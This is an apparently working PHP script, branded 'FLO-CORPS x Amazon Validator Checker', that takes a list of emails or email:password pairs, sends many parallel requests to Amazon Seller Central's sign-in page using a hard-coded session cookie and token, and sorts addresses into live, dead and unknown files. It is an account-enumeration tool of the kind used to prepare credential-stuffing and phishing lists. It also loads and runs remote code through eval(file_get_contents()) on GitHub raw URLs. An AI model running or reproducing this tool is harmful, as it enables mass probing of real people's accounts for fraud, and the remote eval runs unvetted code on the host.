<?php
ini_set("memory_limit",-1);
set_time_limit(0);
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

eval(file_get_contents("https://raw.githubusercontent.com/scid-network/ngentoddddddd/master/RollingCurl/RollingCurl.php"));
eval(file_get_contents("https://raw.githubusercontent.com/scid-network/ngentoddddddd/master/RollingCurl/Request.php"));
eval(file_get_contents("https://raw.githubusercontent.com/scid-network/ngentoddddddd/master/RollingCurl/curl.php"));

echo banner();

enterlist:
$listname = readline("[Input Your List] : ");
if(empty($listname) || !file_exists($listname)) {
	echo"[?] File not found [?]".PHP_EOL;
	goto enterlist;
}
else if($listname == "n") {
	echo "[?] File not found [?]".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline("Result Name [Optional(default:results)] : ");
$dir = empty($savedir) ? "results" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline("Threads [Min 2, Max 30] : ");
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 60 : $reqemail;
if($reqemail > 60) {
	echo "[!] Max 30 [!]".PHP_EOL;
	goto reqemail;
}
else if($reqemail == "1") {
	echo "[!] Min 2 [!]".PHP_EOL;
	goto reqemail;
}
echo PHP_EOL;

$no = 0;
$total = count($lists);
$live = 0;
$die = 0;
$unknown = 0;
$c = 0;
$pecah=10000;
$pecah_list=array_chunk($lists, $pecah);
$tot=count($pecah_list);

for ($i=0;$i<$tot;$i++){
$rollingCurl = new \RollingCurl\RollingCurl();
foreach($pecah_list[$i] as $list){
	$c++;
	if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
$email = str_replace(" ", "", $email);
$url = "https://sellercentral.amazon.com/ap/signin?scid=$email";
$headers = array();
$headers[] = 'Authority: sellercentral.amazon.com';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Origin: https://sellercentral.amazon.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: https://sellercentral.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&';
$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Cookie: signin-sso-state-us=c2ae6648-a10f-4833-a1ae-577e3b0ae8eb; session-id=130-6917767-2542651; i18n-prefs=USD; sp-cdn=\"L5Z9:ID\"; skin=noskin; ubid-main=132-5528687-1677018; appstore-devportal-locale=en_US; at_check=true; AMCVS_4A8581745834114C0A495E2B%40AdobeOrg=1; s_lv_s=First%20Visit; s_cc=true; _mkto_trk=id:365-EFI-026&token:_mch-amazon.com-1604410892069-46678; AMCV_4A8581745834114C0A495E2B%40AdobeOrg=-408604571%7CMCIDTS%7C18570%7CMCMID%7C83620000243335837694527157366073079463%7CMCAAMLH-1605015690%7C3%7CMCAAMB-1605015690%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1604418091s%7CNONE%7CMCAID%7CNONE%7CMCSYNCSOP%7C411-18577%7CvVersion%7C4.6.0; _fbp=fb.1.1604410899237.778717124; referrer_session={%22full_referrer%22:%22https://developer.amazon.com/%22}; mbox=session#e5358fe347e8467bbf7119b05305b707#1604412751|PC#e5358fe347e8467bbf7119b05305b707.36_0#1667655850; s_nr=1604411050633-New; s_lv=1604411050636; ubid-main-av=132-5528687-1677018; session-token=nwZgH3bJTaLFifo0FLsEEvS+1shlfU/Ht7S+G0Tm1S4mmY5lK905MpHZ3d7VorXHQigKj0beqpSzPme1yplxtTp1sgMhwuIG01HGrUGbSI1vAHoEYTRmb/ui8f0jAX0OF3FA4GZ87xgOW6ycqFrKsIeNrsVH1zB7d5mIBNih21XHM1OOhgqkC6V0i7kuLZmhdLisZk4W6baW1X67MgsivEL2I9kyTcne; lc-main-av=id_ID; lc-main=en_US; pay-session-id=2ba0bf6b0a5aa905bf95eb66de57a157; AMCVS_A7493BC75245ACD20A490D4D%40AdobeOrg=1; AMCV_A7493BC75245ACD20A490D4D%40AdobeOrg=-1712354808%7CMCIDTS%7C18570%7CMCMID%7C86424061245214728454411141145403420787%7CMCAAMLH-1605016235%7C3%7CMCAAMB-1605016235%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1604418635s%7CNONE%7CvVersion%7C4.3.0; session-id-time=2235131468l; csm-hit=tb:JNNRC4PAEJ6RFD44AEBY+s-Q4MWBTV49WWHKBY8045V|1604411476784&t:1604411476784&adb:adblk_no';
$data = "appActionToken=yxRjKQmJYS0XmSayMCdlUWiy8Hoj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvbS8%2FcmVmXz1uYXZfeWFfc2lnbmlu&prevRID=ape%3AUTRNV0JUVjQ5V1dIS0JZODA0NVY%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.PbxZz0McMvWfr7NAmCViwBr-Njncju2RrsvURQv377P0wNvM1wsUXw.o9Pk-ZpRnmtqWLZe.HjUzz2MY-owzZELwhGYk3AbPO0OYZotBTDrtJ9DGlDPX7vuH6_zfUmtq0IjT8kobKQp--zagxi_he_wC1KolYHtOOQxiM_WBOmNESXM6B-ERVztBDgKnMyClnXYccIJqX5J5L31boBI6WM3ufNk1CTiTMsBrtjiVuqE4b-xbry0cDcLmnugVWA7Y0sZG6-939fvm0QN5XoMQcSd-_SmvSvpzojN_0lWki6Ii2FM-tYw4sCot8FT5Uop7pBqASypoHdAuu2fQzTGtjoZb7yQu0W_v0BuKmzzoLk0VWFdDvuvHQccG3LomNcjhdvYG5hsOek5k.AEBX-8jKdfFEWWPaDsx_tw&email=$email&password=&create=0&metadata1=ECdITeCs%3AjSogSkLdwHEjKcV9W9d%2FJOmZQHZf7ughw9%2FSm2vULK9TXCyEpV0IuZwohsomqBpRTIBUZ2%2FZcgdSwghBe9lggemVyDjX2LcTHHtU%2B13yzVKP1Hb%2FkC2eqUw3ygioxOkM%2BTMrKxQx8E4ePiHpB2%2BwCo2UZzC9b%2FjCdeRnWoChVNKLtZtp4vZN75iefvGRx10U9dfbt7j7fPrH2Sv%2Bu3MwRxfwUOHNphFygOycnMnzIQtco98fXxdVYRYPkjga77zXBaRpzX0kzmGMiOjwsHjfgwWhYZFqcYz3B5%2BFqtmrzrTAtaMVrPB7aChbQ9JOIJf8yOAzSZX0%2FBlfI6RA4bpfkivBuagRP1AOHgXoq%2B2CrZqqCxsMFC61%2BSp6%2BspnJjkZpUILm2uG8Txx5GaTLkh5ic6FnqZYWiv0tGeEj9OBqps8w6UZ6Vsl90p7TG5RXT3u2fcXd1nTz%2BfTWcJzUdZ3fLkfLygZtEQntyvvmBfkOIYH%2FlOqqw1DDeLz3iTXIjIkZp0uXEcVhLPlF6Ja9YmL6tDkeb3OHnFHjOEtA2VQAI2fgPksrICbKp9MKGEwHOmFtB16Pg4Aozb1hb2RFDJq7S2zKAxeg%2FtdIPMMwYHOPWBxU5qqFSFcNl6sUUCZfHTZvd5IKP%2BVZ5kZ3IPbbhgyizNwL8ya7P7znl8yhnSLjan0V5xFDARvAoJciAFhMBlnx2wIEsBSM1sWqzrpAZLrZlL9PPocDQRN%2FLsw7aPuJNKRQiELKzC5%2FN8s61IbuWARc%2BIguEuinOVzD7bWILuHEwwoxzqgcc40ZD9RuHiC1dIqwlvaAfVKa%2BqV2cniXHWgmkxOZ58aa%2B%2FFOdMc%2BGFIuUau7nIZHDfOMklzm0CG%2FYtZek7sC%2BbCq8z1fe5nhr27Fbgzdr4FrT3ChPzcejNwP7mTl2gAb6nDPLfpamI75uWhuaaumIa4uFhFLTYRLRHd%2FhvldPtFOjWYFw3KZT6L6bx%2BoaASyqtYMpITfxW2x4J70tmVEm4kRqq1BPAdUvTGqSJsJwZfx%2FwiihycXQT9yjiq5%2FNW2F4CpEhkDddF9HrLcGAHQI58LDPjd08x1q13QVsGCwYfM5Hb6WWc7ksD%2Baj6HGsrqw7IlawupVH6FgXGyCnjyktXk9bKUUtRYlS9Am3gLiL27ENhi5xYWZqLO5W52RdI0Ip2WMM89kD4ZvX2QyMqYWCfkX2%2Fjoh9CFXz4WL2GNWz577bpTfkRnYexlBXUrXTR3Rl4Vo176%2BWGKwoaq%2FvBtNaFQInQ7jiKzh6x1b9X4JBlyPQGRWLRO4Lq3dzY331qJ4mYnd73cXbRAe2DYUFbu%2B5pqqwiPerhkGyPCHrxamKHsdgu%2BiOjd%2BEkbXkyWyLGsTAGY1OBXmYh89gchCHQu8zHg8Wvwm6hM2VhAUCCs4mLItANqHkBj0GM%2BYgskJqs5M%2FWMjCshf%2Fl%2FA%2B5YNUJMkuzycDf%2FKvc1Zcwk8aAk7W9VpEWsvPJ%2BOMx%2B0%2Fcb9POWtY8ty4q%2FR%2FE%2F2%2FZJ24DKnG8Czv1O9hToU5hUtytIAdjXAMmMjx%2FXnF5BA2qbrbpIxsYiu7VWxZl3XN6LRFKpjwx9xDwLfsJXT7XkRgU9JUJoP1GltAFslY1MLmsuL%2BVpYPz4l7B9ccaynpWN10n8B%2FJ1f2myRKP2yLHXG2UCnzOJMMPM3jCaN1o8R78%2BNh%2B03GKhcYscenBJnXNMnWVHJ0CH5hQ1B2TPuAocQ5N5JHVJe07ZNclfS71oYO3LsMLhPNvVrHxZUFF5jCYIDQVfpMnvryTnlCIem%2F6uVgBF20TrOe1pCCbqius44U3PnCtGboOeAXnyKPEOCUdyKpqelrTsXxIZzphe6pNBo0D6IWMzgXKlhtJEcsZulBvTM%2FkbBJT43zcepKRc%2B7b156bhiGnjOVlrIEaYs%2FZDG7MHp0XSJIHDk3xO1qsIgtRYyQCarle2M49YvAILx47%2FdNSf07VByWnEtA0daXzVMvzP0jeH00xEbqHCoG2%2BQFAN2tznXm51pfSD2Ne82nUSOUBXkQcYG53mWTCyAmZdWm1EZXYRyC8gvUMir1UWQUlo1VTPcbZ%2Br7h3mzjW%2FHdXSLQRdARp4%2F4xcH6Bp%2FweNK1u8nYnHWVI6q3bn%2FaR2HuricDfE%2F74YX55GlGr1k9BLnETMuDQnybrkl9N9pAtdXmFgtCdq25fqmFleROGVnOEUluN4v2jK3KqzQN3pXdcvhoSlkGxl%2BLlpNwc0wVHB1SyD0dsdeWQUH7XxWvShERuniF7eyzOBGRdexv0azrBQMlG42f9jlQ1mUk3hYnEr%2F2yZahx8LNEWX7F6MC8O0LGbS4gV0eP4fnjC7U1PYeGp6e0VnJg13bUV7B4lkO1DWftXXBX6rLD7NgDhLVBbF9RCPV38mw%2Bq5Snt3Z0ZnYFLly8qv6eQfyKZgjFbOW%2FYxF%2Fp0aILM%2FgJCEVANP1ALo0%2B5paeNVPXwxWqH521w1P2YqGQDmDQJCJvwpY5FN9xiPwPpyKMWWGYb%2FcTUhDdhoVy%2FTKtwiF6Zx0y7XxtuqyaMY%2Bn4JUgzs4hgcerphIzZtkC%2FX10RPJs%2FPHufiVYA2aAcg7Zo5udTnTz3wPgVYIDnVQA6UqnXc9IaM9PDjuwym%2BDw2Er03tmj2xgJUgQtDARd6SLFGS0goERbWb9ZBWfiNlzLnEaRHuoIvtCG72oaOYF1X86Nu46oI%2FTMq9x8aTX1sew0%2F%2BnLkm%2F2n4ur5ROqFQS6mczLs5RS3UFIe0cTJM40iHQ8zWzeC1mAd2SQGr8IH0wdo3N4K2MnKtjDI9xoQteI4q3e0mtJKpvINmcGj0tF8P%2FNyf42rZS53UkdP%2FRGlynZjfTbQw%3D%3D";
$rollingCurl->setOptions(array(CURLOPT_ENCODING => "gzip",CURLOPT_RETURNTRANSFER => 1))->post($url, $data, $headers);

}	
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $listname, $dir, $no,$pecah, $total, $live, $die, $unknown,$pisah;
	$no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$x = $request->getResponseText();
	$email = urldecode($params["scid"]);
	echo "[".date("H:i:s")."]-";
	echo "[".$no."/".$total."]-LIVE:\33[0;32m[".$live."]\033[0m"."-DIE:\33[0;31m[".$die."]\033[0m"."-UNKNOWN:\33[0;33m[".$unknown."]\033[0m"."";
if (inStr($x,'subPageType: "SignInClaimCollect"')){
	$die++;
		file_put_contents("die.txt", $email.PHP_EOL, FILE_APPEND);
		echo " | [FLO-x-AMAZON] |\33[0;31m [DEAD] \033[0m"." => ".$email;
}
elseif (inStr($x,'subPageType: "SignInPwdCollect"')){
	$live++;
		file_put_contents("live.txt", $email.PHP_EOL, FILE_APPEND);
		echo " | [FLO-x-AMAZON] |\33[0;32m [LIVE] \033[0m"." => ".$email;
}
else{
	$unknown++;
		file_put_contents("Unknown.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["CY"]." Unknown".color()["WH"]." => ".$email;
}
	echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
}
echo PHP_EOL." Result For Validation : \n- Total: ".$total." \n-\33[0;32m Live \033[0m".": ".$live." \n-\33[0;31m Dead \033[0m".": ".$die." \n- Unknown: ".$unknown." \n Saved to dir \"".$dir."\" -- ".PHP_EOL;

function banner() {
	$out = "
x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x
x             FLO-CORPS x Amazon Validator Checker                x
x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x
	• Amazon Valid Checker V.666 •

	• Information Checker •
	• Valid Email Check : \33[0;32m √ \033[0m"."
===================================================================".PHP_EOL;
	return $out;
}
function color() {
	return array(
		"LW" => (OS == "linux" ? "\e[1;37m" : ""),
		"WH" => (OS == "linux" ? "\e[0m" : ""),
		"YL" => (OS == "linux" ? "\e[1;33m" : ""),
		"LR" => (OS == "linux" ? "\e[1;31m" : ""),
		"MG" => (OS == "linux" ? "\e[0;35m" : ""),
		"LM" => (OS == "linux" ? "\e[1;35m" : ""),
		"CY" => (OS == "linux" ? "\e[1;36m" : ""),
		"LG" => (OS == "linux" ? "\e[1;32m" : ""),
		"GRN" => (OS == "linux" ? "\e[0;32m" : ""),
		"LGRN" => (OS == "linux" ? "\e[32;4m" : "")

	);
}
?>